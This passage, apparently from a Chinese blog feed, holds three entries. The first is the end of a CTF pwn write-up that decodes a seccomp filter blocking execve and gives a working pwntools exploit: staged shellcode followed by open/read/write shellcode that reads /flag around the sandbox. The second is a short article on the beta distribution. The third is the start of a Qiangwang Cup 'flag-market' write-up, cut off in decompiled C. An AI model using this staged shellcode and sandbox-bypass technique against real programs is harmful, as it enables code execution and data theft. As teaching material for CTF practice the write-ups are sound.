        mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000001267 048 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000001269 048 66 C7 45 D0 20 00             mov     [rbp+var_30], 20h ; &#x27; &#x27;</span><br><span class="line">.text:000000000000126F 048 C6 45 D2 00                   mov     [rbp+var_2E], 0</span><br><span class="line">.text:0000000000001273 048 C6 45 D3 00                   mov     [rbp+var_2D], 0</span><br><span class="line">.text:0000000000001277 048 C7 45 D4 00 00 00 00          mov     [rbp+var_2C], 0</span><br><span class="line">.text:000000000000127E 048 66 C7 45 D8 15 00             mov     [rbp+var_28], 15h</span><br><span class="line">.text:0000000000001284 048 C6 45 DA 02                   mov     [rbp+var_26], 2</span><br><span class="line">.text:0000000000001288 048 C6 45 DB 00                   mov     [rbp+var_25], 0</span><br><span class="line">.text:000000000000128C 048 C7 45 DC 3B 00 00 00          mov     [rbp+var_24], 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:0000000000001293 048 66 C7 45 E0 15 00             mov     [rbp+var_20], 15h</span><br><span class="line">.text:0000000000001299 048 C6 45 E2 01                   mov     [rbp+var_1E], 1</span><br><span class="line">.text:000000000000129D 048 C6 45 E3 00                   mov     [rbp+var_1D], 0</span><br><span class="line">.text:00000000000012A1 048 C7 45 E4 42 01 00 00          mov     [rbp+var_1C], 142h</span><br><span class="line">.text:00000000000012A8 048 66 C7 45 E8 06 00             mov     [rbp+var_18], 6</span><br><span class="line">.text:00000000000012AE 048 C6 45 EA 00                   mov     [rbp+var_16], 0</span><br><span class="line">.text:00000000000012B2 048 C6 45 EB 00                   mov     [rbp+var_15], 0</span><br><span class="line">.text:00000000000012B6 048 C7 45 EC 00 00 FF 7F          mov     [rbp+var_14], 7FFF0000h</span><br><span class="line">.text:00000000000012BD 048 66 C7 45 F0 06 00             mov     [rbp+var_10], 6</span><br><span class="line">.text:00000000000012C3 048 C6 45 F2 00                   mov     [rbp+var_E], 0</span><br><span class="line">.text:00000000000012C7 048 C6 45 F3 00                   mov     [rbp+var_D], 0</span><br><span class="line">.text:00000000000012CB 048 C7 45 F4 00 00 00 00          mov     [rbp+var_C], 0</span><br><span class="line">.text:00000000000012D2 048 66 C7 45 C0 05 00             mov     word ptr [rbp+var_40], 5</span><br><span class="line">.text:00000000000012D8 048 48 8D 45 D0                   lea     rax, [rbp+var_30]</span><br><span class="line">.text:00000000000012DC 048 48 89 45 C8                   mov     [rbp+var_38], rax</span><br><span class="line">.text:00000000000012E0 048 41 B8 00 00 00 00             mov     r8d, 0</span><br><span class="line">.text:00000000000012E6 048 B9 00 00 00 00                mov     ecx, 0</span><br><span class="line">.text:00000000000012EB 048 BA 00 00 00 00                mov     edx, 0</span><br><span class="line">.text:00000000000012F0 048 BE 01 00 00 00                mov     esi, 1</span><br><span class="line">.text:00000000000012F5 048 BF 26 00 00 00                mov     edi, 26h ; &#x27;&amp;&#x27;                  ; option</span><br><span class="line">.text:00000000000012FA 048 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000012FF 048 E8 DC FD FF FF                call    _prctl</span><br><span class="line">.text:00000000000012FF</span><br><span class="line">.text:0000000000001304 048 48 8D 45 C0                   lea     rax, [rbp+var_40]</span><br><span class="line">.text:0000000000001308 048 48 89 C2                      mov     rdx, rax</span><br><span class="line">.text:000000000000130B 048 BE 02 00 00 00                mov     esi, 2</span><br><span class="line">.text:0000000000001310 048 BF 16 00 00 00                mov     edi, 16h                        ; option</span><br><span class="line">.text:0000000000001315 048 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000000131A 048 E8 C1 FD FF FF                call    _prctl</span><br><span class="line">.text:000000000000131A</span><br><span class="line">.text:000000000000131F 048 90                            nop</span><br><span class="line">.text:0000000000001320 048 48 8B 45 F8                   mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000001324 048 64 48 33 04 25 28 00 00 00    xor     rax, fs:28h</span><br><span class="line">.text:000000000000132D 048 74 05                         jz      short locret_1334</span><br><span class="line">.text:000000000000132D</span><br><span class="line">.text:000000000000132F 048 E8 7C FD FF FF                call    ___stack_chk_fail</span><br><span class="line">.text:000000000000132F</span><br><span class="line">.text:0000000000001334                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001334</span><br><span class="line">.text:0000000000001334                                   locret_1334:                            ; CODE XREF: sandbox+DF↑j</span><br><span class="line">.text:0000000000001334 048 C9                            leave</span><br><span class="line">.text:0000000000001335 000 C3                            retn</span><br><span class="line">.text:0000000000001335                                   ; &#125; // starts at 124E</span><br><span class="line">.text:0000000000001335</span><br><span class="line">.text:0000000000001335                                   sandbox endp</span><br></pre></td></tr></table></figure><p>为了理解 sandbox，需要理解一下函数 <code>prctl</code>。</p><p>函数原型：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line"></span><br><span class="line">int prctl(int option, unsigned long arg2, unsigned long arg3,</span><br><span class="line">          unsigned long arg4, unsigned long arg5);</span><br></pre></td></tr></table></figure><p>和其他函数有所区别的是，该函数所需要的参数即 <code>arg2..arg5</code> 是取决于第一个参数即 <code>option</code> 的，而 <code>option</code> 的可选项是很多的，下面我贴出的是本题所用到的两个 <code>option</code>：</p><p><code>option = 0x26 = PR_SET_NO_NEW_PRIVS</code>：</p><ul><li><strong>含义</strong>：开启 <strong>no_new_privs</strong> 标志后，该进程及其子孙<strong>再也不能通过 <code>execve</code> 获得更高权限</strong>（例如 <code>setuid</code> 程序不再提权、文件能力不再生效）。</li><li><strong>用途</strong>：装载 seccomp 过滤器时的常见前置条件（避免“先降低再抬高”的逃逸）。</li><li><strong>范围</strong>：继承到子进程（<code>fork/exec</code>）。</li></ul><p><code>option = 0x16 = PR_SET_SECCOMP</code>：</p><ul><li><strong>含义</strong>：为当前进程启用 <strong>seccomp-BPF</strong> 过滤；<code>arg3</code> 指向 <code>struct sock_fprog</code>，里面是一组 classic BPF 指令（你题里的 5 条），用来<strong>判定每个系统调用是允许&#x2F;拒绝&#x2F;杀进程&#x2F;返回特定 errno</strong> 等。</li><li><strong>典型动作码</strong>（<code>RET</code> 的 <code>k</code> 值）：<ul><li><code>SECCOMP_RET_ALLOW</code>（放行）</li><li><code>SECCOMP_RET_KILL_PROCESS</code>（直接杀掉当前进程）</li><li><code>SECCOMP_RET_TRAP</code>（向用户态发 <code>SIGSYS</code>）</li><li><code>SECCOMP_RET_ERRNO | (errno &amp; 0xFFFF)</code>（让该系统调用以指定 errno 失败）</li><li><code>SECCOMP_RET_TRACE</code>、<code>SECCOMP_RET_USER_NOTIF</code>（配合 ptrace &#x2F; 用户态通知框架）</li></ul></li><li><strong>要求</strong>：通常在设置前需要 <code>no_new_privs</code>&#x3D;1（或有 <code>CAP_SYS_ADMIN</code> 且系统允许的策略），否则 <code>EINVAL/EPERM</code>。$\Leftarrow$这是为什么本题会采用两个 prctl 的原因</li></ul><p>其中提到的 classic BPF（cBPF） 指令指的是最早一代的 32-位“小虚拟机”指令集，它只有两个寄存器 A（累加器）和 X（索引），再加 16 个 scratch 内存槽 <code>M[0..15]</code>。Linux 的 <strong>seccomp-BPF</strong> 复用了这套 <strong>cBPF</strong> 指令来写“系统调用过滤器”（鉴别每次 syscall 是允许、拒绝、杀进程、返回 errno 等）。</p><p>cBPF 的每一条指令是一个 <code>sock_filter</code>，包含 4 个字段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sock_filter &#123;</span><br><span class="line">  __u16 code;  // 指令编码（类/大小/来源/操作）</span><br><span class="line">  __u8  jt;    // 条件为真跳过的指令数 (jump-if-true)</span><br><span class="line">  __u8  jf;    // 条件为假跳过的指令数 (jump-if-false)</span><br><span class="line">  __u32 k;     // 立即数 / 偏移 / 返回值（视指令而定）</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在题目中对应的部分就是那一大块 mov 指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001269 048 66 C7 45 D0 20 00             mov     [rbp+var_30], 20h ; &#x27; &#x27;</span><br><span class="line">.text:000000000000126F 048 C6 45 D2 00                   mov     [rbp+var_2E], 0</span><br><span class="line">.text:0000000000001273 048 C6 45 D3 00                   mov     [rbp+var_2D], 0</span><br><span class="line">.text:0000000000001277 048 C7 45 D4 00 00 00 00          mov     [rbp+var_2C], 0</span><br><span class="line">.text:000000000000127E 048 66 C7 45 D8 15 00             mov     [rbp+var_28], 15h</span><br><span class="line">.text:0000000000001284 048 C6 45 DA 02                   mov     [rbp+var_26], 2</span><br><span class="line">.text:0000000000001288 048 C6 45 DB 00                   mov     [rbp+var_25], 0</span><br><span class="line">.text:000000000000128C 048 C7 45 DC 3B 00 00 00          mov     [rbp+var_24], 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:0000000000001293 048 66 C7 45 E0 15 00             mov     [rbp+var_20], 15h</span><br><span class="line">.text:0000000000001299 048 C6 45 E2 01                   mov     [rbp+var_1E], 1</span><br><span class="line">.text:000000000000129D 048 C6 45 E3 00                   mov     [rbp+var_1D], 0</span><br><span class="line">.text:00000000000012A1 048 C7 45 E4 42 01 00 00          mov     [rbp+var_1C], 142h</span><br><span class="line">.text:00000000000012A8 048 66 C7 45 E8 06 00             mov     [rbp+var_18], 6</span><br><span class="line">.text:00000000000012AE 048 C6 45 EA 00                   mov     [rbp+var_16], 0</span><br><span class="line">.text:00000000000012B2 048 C6 45 EB 00                   mov     [rbp+var_15], 0</span><br><span class="line">.text:00000000000012B6 048 C7 45 EC 00 00 FF 7F          mov     [rbp+var_14], 7FFF0000h</span><br><span class="line">.text:00000000000012BD 048 66 C7 45 F0 06 00             mov     [rbp+var_10], 6</span><br><span class="line">.text:00000000000012C3 048 C6 45 F2 00                   mov     [rbp+var_E], 0</span><br><span class="line">.text:00000000000012C7 048 C6 45 F3 00                   mov     [rbp+var_D], 0</span><br><span class="line">.text:00000000000012CB 048 C7 45 F4 00 00 00 00          mov     [rbp+var_C], 0</span><br></pre></td></tr></table></figure><p>解码后的 5 条 BPF 指令如下（按内存从 <code>var_30</code> 到 <code>var_10</code> 的顺序即从低到高的排序）：</p><ol><li><p><strong>LD W ABS 0</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x20, jt=0, jf=0, k=0 &#125;    // BPF_LD | BPF_W | BPF_ABS, 从 seccomp_data 结构偏移0处加载 syscall 编号</span><br></pre></td></tr></table></figure><blockquote><p>将当前系统调用号装载到累加器 A。</p></blockquote></li><li><p><strong>JEQ 59, jt&#x3D;2, jf&#x3D;0</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x15, jt=2, jf=0, k=59 &#125;   // 59 = __NR_execve (x86_64)</span><br></pre></td></tr></table></figure><blockquote><p>如果 <code>syscall == 59 (execve)</code>，跳过<strong>后面两条</strong>指令（即跳到第5条）。</p></blockquote></li><li><p><strong>JEQ 0x142, jt&#x3D;1, jf&#x3D;0</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x15, jt=1, jf=0, k=0x142 &#125; // 0x142 = 322 = __NR_execveat (x86_64)</span><br></pre></td></tr></table></figure><blockquote><p>如果 <code>syscall == 322 (execveat)</code>，跳过<strong>后一条</strong>指令（也跳到第5条）。</p></blockquote></li><li><p><strong>RET ALLOW</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x06, jt=0, jf=0, k=0x7FFF0000 &#125; // SECCOMP_RET_ALLOW</span><br></pre></td></tr></table></figure><blockquote><p>上述两条件都不满足（不是 execve&#x2F;execveat）→ 允许该系统调用。</p></blockquote></li><li><p><strong>RET KILL</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x06, jt=0, jf=0, k=0x00000000 &#125; // SECCOMP_RET_KILL (KILL_PROCESS)</span><br></pre></td></tr></table></figure><blockquote><p>命中第2或第3条跳转来到这里 → 直接杀掉进程。</p></blockquote></li></ol><p>这也就说明了，本题不允许使用的系统调用：</p><ul><li><code>execve</code> </li><li><code>execveat</code></li></ul><p>当然，这一部分的分析也可以交给 AI 来快速处理：</p><p><img src="/img/simple_shellcode/image-20251103094712059.png" alt="img"></p><p>沙盒之后，就出现一个关键点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013B0 018 48 8B 55 F8                   mov     rdx, [rbp+buf]</span><br><span class="line">.text:00000000000013B4 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013B9 018 FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>还记得我们一开始看到的 mmap 开辟的虚拟内存空间吗，那块的首地址就存在在 <code>[rbp+buf]</code> 当中，依据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000134C 018 B8 00 00 FE CA                mov     eax, 0CAFE0000h</span><br><span class="line">.text:0000000000001351 018 48 89 45 F8                   mov     [rbp+buf], rax</span><br></pre></td></tr></table></figure><p>那么，如果我们能向地址 <code>0xcafe0000</code> 写入 shellcode，然后通过 call 一调用，就可以获取到 flag 了。</p><h2 id="四、思路汇总"><a href="#四、思路汇总" class="headerlink" title="四、思路汇总"></a>四、思路汇总</h2><p>首先，我们整理一下有用的信息：</p><ul><li>有一块可读可写可执行的虚拟内存，并且能向其中写入 0x10B 的数据；</li><li>有 <code>call</code> 指令；</li><li>存在沙盒，不允许使用 <code>execve</code> 和 <code>execveat</code>。</li></ul><p>这么一联系，我们就可以知道本题的难点在于：</p><ol><li>shellcode 的长度被限制；</li><li>沙盒保护。</li></ol><p>因此，我们的思路就是，先写入较短的 shellcode 实现再次写入且将写入的长度限制给放开，然后再写入较长的 shellcode 来获取 flag 且该 shellcode 需要符合沙盒要求。</p><h2 id="五、Poc-构造"><a href="#五、Poc-构造" class="headerlink" title="五、Poc 构造"></a>五、Poc 构造</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./vuln_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">25836</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = conn()</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, rax;</span></span><br><span class="line"><span class="string">    mov rsi, rdx;</span></span><br><span class="line"><span class="string">    add rsi, 0x10;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">    call rsi;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please input your shellcode:&#x27;</span>,shellcode)</span><br><span class="line">    </span><br><span class="line">    shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0010</span>,<span class="number">0x50</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0010</span>,<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>一步步分析，我们对第一次 shellcode 的要求就两个：</p><ul><li>简短</li><li>实现再次写入</li></ul><p>程序已经非常贴心地为我们准备了两行指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013B0 018 48 8B 55 F8                   mov     rdx, [rbp+buf]</span><br><span class="line">.text:00000000000013B4 018 B8 00 00 00 00                mov     eax, 0</span><br></pre></td></tr></table></figure><p>eax 中已经存放了 read 系统调用的系统调用号，rdx 中已经存放了我们要写入的位置即 <code>0xcafe0000</code>。</p><p>因此，为了实现再次 read，我们只需要：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, rax;</span><br><span class="line">mov rsi, rdx;</span><br><span class="line">add rsi, 0x10;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure><blockquote><p>这里还将写入位置进行了“加 <code>0x10</code>”的操作，是为了保护本轮的 shellcode不被后续的 shellcode 破坏。</p></blockquote><p>可是，写入完成之后，我们就已经用完了 <code>call</code> 指令，那么后续还需要执行新的 shellcode 怎么做到呢？</p><p>没错，就像构造 ROP 一样，我们再后面跟上一条：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call rsi;</span><br></pre></td></tr></table></figure><p>此时 rsi 中存放的依旧是地址 <code>0xcafe0000</code>，但是其中的内容已经通过第二次 read 修改成新的 shellcode 了。</p><p>我们可以检查一下 shellcode 的长度，我跑出来是 14，刚好满足小于 16。</p><p>后续，我们为了避免被沙盒过滤，采用 ORW 的方式来绕过。</p><p>当然，也可以直接使用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br></pre></td></tr></table></figure><p>来替换，因为 <code>shellcraft.cat(&quot;/flag&quot;)</code> 生成的 shellcode 使用的是“Open + Sendfile”的组合，也不会被沙盒过滤。</p><p>最终本地执行效果：</p><p><img src="/img/simple_shellcode/image-20251103110240978.png" alt="img"></p><p>成功拿到 flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Pwn </category>
          
          <category> Shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ORW </tag>
            
            <tag> sandbox </tag>
            
            <tag> Shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贝塔分布</title>
      <link href="/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/"/>
      <url>/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="贝塔分布"><a href="#贝塔分布" class="headerlink" title="贝塔分布"></a>贝塔分布</h1><p>贝塔分布是一种连续概率分布，它描述了在一个固定区间内的随机变量的概率分布</p><p>贝塔分布由两个正数参数α(alpha)和β(beta)定义，这两个参数决定了分布的形状</p><p>它的概率密度函数 (PDF) 公式如下：</p><p>$$<br>f(x;\alpha, \beta) &#x3D; \frac{\Gamma(\alpha+\beta)}{\Gamma(\alpha)\Gamma(\beta)}x^{\alpha-1}(1-x)^{\beta-1}<br>$$</p><p>其中：<strong>x</strong>是一个介于0和1之间的随机变量</p><p>$\Gamma()$是伽马函数，根据其参数有两种不同的定义：</p><p>$$<br>\begin{cases}<br>\Gamma(n)&#x3D;(n-1)!\<br>\Gamma(z) &#x3D; \int_{0}^{\infty}t^{z-1}e^{-t}dt<br>\end{cases}<br>$$</p><p>其中：</p><ul><li><p>z为除去非正整数的整个复数域</p></li><li><p>n为正整数</p></li></ul><h3 id="主要性质与特征"><a href="#主要性质与特征" class="headerlink" title="主要性质与特征"></a>主要性质与特征</h3><p>贝塔分布具有一些重要的统计特性：</p><ul><li>期望：$E[x] &#x3D; \frac{\alpha}{\alpha+\beta}$</li></ul><ul><li><p>方差：$Var(x) &#x3D; \frac{\alpha\beta}{{(\alpha+\beta)}^2(\alpha+\beta+1)}$</p></li><li><p>众数：$\frac{\alpha-1}{\alpha+\beta-2}$</p></li></ul><blockquote><p>期望：是试验中每次可能的结果乘以其结果概率的总和<br>方差：描述的是一个随机变量的离散程度，即一组数字与其平均值之间的距离的度量，是随机变量与其总体均值或样本均值的离差的平方的期望<br>众数：指一组数据中出现次数最多的数据值</p></blockquote><p>贝塔分布的一个显著特点是其<strong>灵活性</strong>。通过调整 α 和 β 的值，可以得到各种形状的分布，例如：</p><ul><li><strong>α &#x3D; 1, β &#x3D; 1:</strong> 此时贝塔分布退化为 上的均匀分布。</li><li><strong>α &gt; 1, β &gt; 1:</strong> 分布呈现单峰形态。</li><li><strong>α &lt; 1, β &lt; 1:</strong> 分布呈现 U 形。</li><li><strong>α &#x3D; 1, β &gt; 1:</strong> 分布呈 J 形，向左偏斜。</li><li><strong>α &gt; 1, β &#x3D; 1:</strong> 分布呈反 J 形，向右偏斜。</li></ul><p>这种多变性使得贝塔分布能够模拟在 (0, 1) 区间内极大似然法可能求出的任意最大值点的概率值。</p><h3 id="为何使用贝塔分布？"><a href="#为何使用贝塔分布？" class="headerlink" title="为何使用贝塔分布？"></a>为何使用贝塔分布？</h3><p>贝塔分布在实际应用中非常有用，主要原因如下：</p><ol><li><p><strong>为概率建模:</strong> 由于其值域在0和1之间，它天然地适用于为某项实验的成功概率建模</p></li><li><p><strong>贝叶斯统计中的应用:</strong> 在贝叶斯推断中，贝塔分布是二项分布的<strong>共轭先验</strong>。 这意味着，如果使用贝塔分布作为二项分布中成功概率的先验分布，那么在观测到新数据后，其后验分布仍然是贝塔分布，这极大地简化了计算</p></li></ol><p><strong>举例说明：</strong><br>假设我们要预测一位棒球运动员的击球率。在没有观察任何比赛之前，我们可以根据历史数据或经验设定一个先验的贝塔分布（例如，平均击球率在 0.27 左右）。 当这位运动员进行了一些比赛后（例如，10 次击球，3 次命中），我们可以利用贝叶斯公式来更新这个分布。新的后验分布仍然是一个贝塔分布，但它的形状会根据新的数据进行调整，从而为我们提供一个更精确的击球率预测</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 知识点 </category>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九届强网杯线上赛Pwn_flag-market</title>
      <link href="/2025/10/25/flag-market/"/>
      <url>/2025/10/25/flag-market/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第九届强网杯线上赛PWN-flag-market"><a href="#第九届强网杯线上赛PWN-flag-market" class="headerlink" title="第九届强网杯线上赛PWN_flag-market"></a>第九届强网杯线上赛PWN_flag-market</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203039923-1200912138.png"><img src="/img/flag-market/3622178-20251023203039923-1200912138.png" alt="img"></a></p><h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203727187-200295548.png"><img src="/img/flag-market/3622178-20251023203727187-200295548.png" alt="img"></a></p><p>这个文件在附件中的bin目录下。</p><p>通过<code>file</code>命令查看文件类型：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203957917-176528406.png"><img src="/img/flag-market/3622178-20251023203957917-176528406.png" alt="image"></a></p><p>通过<code>checksec</code>命令查看文件保护措施：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023204015264-1836719827.png"><img src="/img/flag-market/3622178-20251023204015264-1836719827.png" alt="image"></a></p><h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><h3 id="1、分析程序基本逻辑"><a href="#1、分析程序基本逻辑" class="headerlink" title="1、分析程序基本逻辑"></a>1、分析程序基本逻辑</h3><p>将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我们通过看C语言代码来把握整体代码逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(<span class="type">char</span> **a1@&lt;rsi&gt;, <span class="type">char</span> **a2@&lt;rdx&gt;, __int64 a3@&lt;rbp&gt;, __int64 a4@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// rt1</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp-8Ch] [rbp-8Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp-80h] [rbp-80h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// [rsp-71h] [rbp-71h]</span></span><br><span class="line">  <span class="type">signed</span> __int16 v13; <span class="comment">// [rsp-6Dh] [rbp-6Dh]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-68h] [rbp-68h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v17 = a3;</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_401336(a4, a1, a2);</span><br><span class="line">  v12 = <span class="string">&#x27;alf/&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v11 = my_fopen(&amp;v12, &amp;unk_402008);</span><br><span class="line">  dword_40430C = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    my_puts(<span class="string">&quot;how much you want to pay?&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(aThankYouForPay);</span><br><span class="line">      <span class="keyword">if</span> ( !dword_40430C || (v4 = (__int64 *)<span class="number">64</span>, !my_fgets(&amp;v15, <span class="number">64LL</span>, v11)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="string">&quot;something is wrong&quot;</span>;</span><br><span class="line">        my_puts(<span class="string">&quot;something is wrong&quot;</span>);</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">64</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="string">&quot;\nThank you for your patronage!&quot;</span>;</span><br><span class="line">          my_puts(<span class="string">&quot;\nThank you for your patronage!&quot;</span>);</span><br><span class="line">          result = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)&amp;v17 + i - <span class="number">80</span>) == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        my_putchar((<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)&amp;v17 + i - <span class="number">80</span>));</span><br><span class="line">        my_sleep(<span class="number">1LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      my_memset(&amp;v15, <span class="number">0LL</span>, <span class="number">64LL</span>);</span><br><span class="line">   